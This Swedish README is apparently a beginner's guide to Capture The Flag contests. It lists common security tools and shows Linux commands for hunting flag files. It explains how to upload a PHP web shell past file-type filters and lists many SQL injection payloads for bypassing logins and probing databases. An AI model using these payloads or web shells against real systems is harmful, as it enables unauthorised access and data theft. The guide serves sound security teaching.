# CTF Guide: Vanliga Attacker och Exempel

Den här README-filen förklarar några vanliga tekniker och sårbarheter som ofta förekommer i Capture The Flag (CTF)-tävlingar, inklusive exempel på attacker och tips på hur de kan användas.


## 0. Tools

Här är några användbara verktyg, script och wordlists för CTF:

- **Burp Suite** – Web proxy för att analysera och manipulera HTTP-trafik. [https://portswigger.net/burp](https://portswigger.net/burp)
- **sqlmap** – Automatisk SQL-injektionsverktyg. [https://sqlmap.org/](https://sqlmap.org/)
- **ffuf** – Snabb webbfuzzing. [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)
- **Gobuster** – Directory brute-forcer. [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
- **Hydra** – Brute force för många protokoll. [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
- **John the Ripper** – Lösenordsknäckare. [https://www.openwall.com/john/](https://www.openwall.com/john/)
- **hashcat** – Avancerad lösenordsknäckare. [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)
- **nmap** – Portskanner och nätverksanalys. [https://nmap.org/](https://nmap.org/)
- **CyberChef** – "The Cyber Swiss Army Knife" för kodning, dekodning och analys. [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
- **binwalk** – Firmware- och filanalys. [https://github.com/ReFirmLabs/binwalk](https://github.com/ReFirmLabs/binwalk)
- **Ghidra** – Reverse engineering. [https://ghidra-sre.org/](https://ghidra-sre.org/)
- **radare2** – Reverse engineering. [https://rada.re/n/](https://rada.re/n/)
- **Stegsolve** – Bildanalys för steganografi. [https://github.com/zardus/ctf-tools/blob/master/steghide.md](https://github.com/zardus/ctf-tools/blob/master/steghide.md)
- **Wireshark** – Nätverksanalys. [https://www.wireshark.org/](https://www.wireshark.org/)

**Wordlists:**
- **SecLists** – Stort samling ordlistor för brute force, fuzzing, discovery m.m. [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- **rockyou.txt** – Klassisk lösenordslista, finns i SecLists och Kali Linux.

**Samlingar av CTF-verktyg och script:**
- [Awesome CTF](https://github.com/apsdehal/awesome-ctf)
- [CTF-Tools (installationsscript)](https://github.com/zardus/ctf-tools)

**Tips:**
- Många av dessa verktyg finns förinstallerade i Kali Linux och Parrot OS.
- Lär dig använda terminalen och kombinera verktyg för bästa resultat.

## 1. Om man kan ladda upp filer

Om det finns möjlighet att ladda upp filer på en webbplats kan det vara möjligt att ladda upp skadliga filer, t.ex. en webbshell (exempelvis shell.php). Med en webbshell kan du köra kommandon direkt på servern via webbläsaren och få full kontroll över systemet, beroende på serverns rättigheter.

Tips:
- Testa att ladda upp olika filtyper, t.ex. .php, .phtml, .asp, .jpg.php.
- Försök kringgå filtypskontroller genom att ändra filändelse eller innehåll.
- Om du lyckas ladda upp en shell (t.ex. shell.php), besök filen i webbläsaren och kör kommandon på servern.


Exempel: Det finns färdiga webbshells på GitHub som du kan ladda upp för att få en webbaserad terminal på servern. Sök t.ex. efter "php webshell" på GitHub.

**Tips:** En bra fil att ladda upp är denna webbshell: [shell.php från henrikhjelmse/ctf](https://github.com/henrikhjelmse/ctf/blob/main/shell.php)

Detta ger dig ett kommandofält via URL:en, t.ex. `shell.php?cmd=whoami`.

## 2. Find-kommandot för att hitta flag.txt

Om du har tillgång till ett terminal- eller shellgränssnitt på servern kan du använda `find`-kommandot för att leta efter flagg-filer. Ett vanligt exempel är att hitta en fil som heter `flag.txt` någonstans i filsystemet:

```bash
find / -name flag.txt 2>/dev/null
```

Detta söker igenom hela filsystemet efter en fil med namnet `flag.txt` och döljer eventuella felmeddelanden om otillåtna kataloger. Om du vet att flaggan kan ligga i t.ex. hemkatalogen kan du begränsa sökningen:

```bash
find /home -name flag.txt 2>/dev/null
```

Tips:
- Använd `cat` för att visa innehållet i filen när du hittat den: `cat /sökväg/till/flag.txt`
- Om du har begränsade rättigheter, försök söka i kataloger du har tillgång till.

## 3. vanliga kommandon i linux, som man brukar använda i ctf

När du utforskar en server eller en fil i en CTF kan följande kommandon och tekniker vara användbara:

- **strings**: Visar läsbara textsträngar i binära filer. Användbart för att hitta gömda meddelanden eller flaggor i program:
	```bash
	strings filnamn
	```

- **file**: Identifierar filtyp, t.ex. om en fil är en bild, ett arkiv eller ett program:
	```bash
	file filnamn
	```

- **find**: Sök efter filer eller mappar med specifika namn eller egenskaper:
	```bash
	find /sökväg -name "*.php"
	```

- **ls, cd, pwd**: Navigera i filsystemet, lista filer och visa nuvarande katalog.

- **grep**: Sök efter text i filer, t.ex. för att hitta flaggor eller lösenord:
	```bash
	grep -ri "flag" /sökväg
	```

- **hexdump, xxd**: Visa innehållet i filer i hex-format, ibland göms flaggor i binärdata.

Tips:
- Utforska alla mappar du har tillgång till, särskilt ovanliga eller dolda kataloger (t.ex. `.hidden`).
- Kombinera kommandon, t.ex. `find . -type f | xargs strings | grep CTF` för att leta efter flaggor i många filer.

- **sudo, su**: Används för att få högre behörighet (root). Om du har lösenordet eller om användaren har rättigheter i `/etc/sudoers` kan du köra kommandon som root:
	```bash
	sudo kommando
	su
	```
	I CTF-sammanhang kan du ibland hitta lösenord i filer eller miljövariabler, eller utnyttja felaktiga sudo-inställningar för att få root-access. Testa t.ex. `sudo -l` för att se vad du får köra som root.


## 4. Förklara mappstrukturen i Linux

Att förstå Linux filsystem är viktigt i CTF, eftersom flaggor och intressanta filer ofta göms i olika kataloger. Här är några vanliga mappar:

- **/etc/** – Systemkonfiguration. Här finns t.ex. lösenordsfiler (`/etc/passwd`, `/etc/shadow`), sudoers (`/etc/sudoers`) och konfigurationsfiler för tjänster.
- **/root/** – Hemkatalog för root-användaren. Ofta göms flaggor här om du behöver root-access.
- **/home/** – Hemkataloger för vanliga användare, t.ex. `/home/ctfuser`. Här kan användarspecifika flaggor eller nycklar ligga.
- **/var/** – Innehåller loggar (`/var/log/`), webbdata (`/var/www/`), mail och andra variabla data. Kolla loggar för lösenord, tokens eller flaggor.
- **/tmp/** – Temporära filer. Ofta skrivbar för alla användare, ibland göms flaggor eller kan användas för exploits.
- **/opt/** – Tilläggsprogram och ibland CTF-specifika program eller filer.

Vanliga platser för flaggor i CTF:
- `/root/flag.txt`, `/home/ctf/flag.txt`, `/var/www/html/flag.txt`, `/opt/flag.txt`, `/tmp/flag.txt`
- I konfigurationsfiler, script eller dolda filer (t.ex. `.flag` eller `.hidden`)

Tips:
- Använd `ls -la` för att se dolda filer.
- Sök i dessa mappar först om du letar efter flaggor eller känslig information.



## 5. SQL-injektion

SQL-injektion är en sårbarhet där du kan manipulera en databasfråga genom att skriva speciella tecken i t.ex. inloggningsformulär. Målet är ofta att logga in utan lösenord eller att dumpa data från databasen.

**Exempel på payloads att testa i username eller password:**

- I username-fältet:
	```
	' OR 1=1 --
	admin' --
	" OR "1"="1
	' UNION SELECT 1,2,3 --
	' OR '' = '
	' OR 1=1#
	' OR 1=1/*
	' OR 1=1 LIMIT 1; --
	' OR sleep(5)--
	' OR 1=1 AND ''=' 
	' OR 1=1 AND 1=1 --
	' OR 1=1 AND 1=2 --
	' OR 1=1 ORDER BY 1 --
	' OR 1=1 ORDER BY 2 --
	' OR 1=1 ORDER BY 3 --
	' OR 1=1 ORDER BY 100 --
	' OR EXISTS(SELECT * FROM users) --
	' OR (SELECT COUNT(*) FROM users) > 0 --
	' OR (SELECT SUBSTRING(@@version,1,1))='5 --
	' OR ASCII(SUBSTRING((SELECT database()),1,1))=115 --
	```

- I password-fältet (om användarnamnet är känt, t.ex. admin):
	```
	' OR 'a'='a
	" OR "a"="a
	' OR 1=1#
	' OR '' = '
	' OR 1=1 --
	' OR 1=1/*
	' OR sleep(5)--
	' OR 1=1 LIMIT 1; --
	' OR 1=1 AND ''=' 
	' OR 1=1 AND 1=1 --
	' OR 1=1 ORDER BY 1 --
	' OR 1=1 ORDER BY 2 --
	' OR 1=1 ORDER BY 3 --
	' OR 1=1 ORDER BY 100 --
	' OR EXISTS(SELECT * FROM users) --
	' OR (SELECT COUNT(*) FROM users) > 0 --
	' OR (SELECT SUBSTRING(@@version,1,1))='5 --
	' OR ASCII(SUBSTRING((SELECT database()),1,1))=115 --
	```

**Hur det fungerar:**
Om webbplatsen gör en SQL-fråga som:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```
och du anger `' OR 1=1 --` som användarnamn, blir frågan:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '';
```
vilket alltid är sant och kan ge dig inloggning utan rätt lösenord.

**Tips:**
- Testa olika varianter av enkla och dubbla citattecken.
- Leta efter felmeddelanden eller ovanligt beteende.
- Använd verktyg som sqlmap för att automatisera tester.


## 6. Övriga tips

- **Läs uppgiften noggrant:** Många flaggor göms i detaljerna. Läs alltid hela beskrivningen och titta på eventuella bilagor eller bilder.

- **Dokumentera allt:** Skriv ner vad du testar och vilka resultat du får. Det sparar tid och hjälper dig att hitta mönster.

- **Automatisera där det går:** Använd verktyg som Burp Suite, sqlmap, gobuster, wfuzz, hydra, John the Ripper, hashcat, nmap, ffuf, stegsolve, binwalk, Ghidra, radare2, CyberChef m.fl.

- **Lär dig läsa och skriva enkla script:** Python och Bash är ovärderliga för att automatisera och analysera data.

- **Samarbeta:** Om du kör CTF i lag, kommunicera och dela insikter. Ofta ser någon annan något du missar.

- **Kolla writeups:** Läs andras lösningar på liknande utmaningar för inspiration och lärande. Exempel: [CTFTime Writeups](https://ctftime.org/writeups), [Awesome CTF Writeups](https://github.com/apsdehal/awesome-ctf#writeups-collections)

- **Känn till vanliga filformat och kodningar:** Många flaggor göms i base64, hex, rot13, zip, png, wav, pdf, etc. Testa att konvertera och extrahera data.

- **Testa edge cases:** Prova ovanliga indata, långa strängar, specialtecken, tomma fält, m.m.

- **Kör alltid `ls -la` och kolla dolda filer/kataloger.**

- **Kolla miljövariabler och processer:** Kommandon som `env`, `set`, `ps aux` kan avslöja lösenord, tokens eller flaggor.

- **Lär dig grunderna i reversering och forensik:** Många CTF:er har binära utmaningar eller filanalys.

- **Resurser och övningsplattformar:**
	- [OverTheWire](https://overthewire.org/wargames/)
	- [Hack The Box](https://www.hackthebox.com/)
	- [Root-Me](https://www.root-me.org/)
	- [PicoCTF](https://picoctf.org/)
	- [Awesome CTF](https://github.com/apsdehal/awesome-ctf)

- **Vanliga misstag:**
	- Glömmer att testa enkla saker först
	- Missar dolda filer eller kataloger
	- Fokuserar för mycket på ett spår
	- Glömmer att läsa loggar eller output noggrant

**Kom ihåg:** CTF handlar om att lära sig, ha kul och tänka kreativt! Våga testa, misslyckas och försök igen.
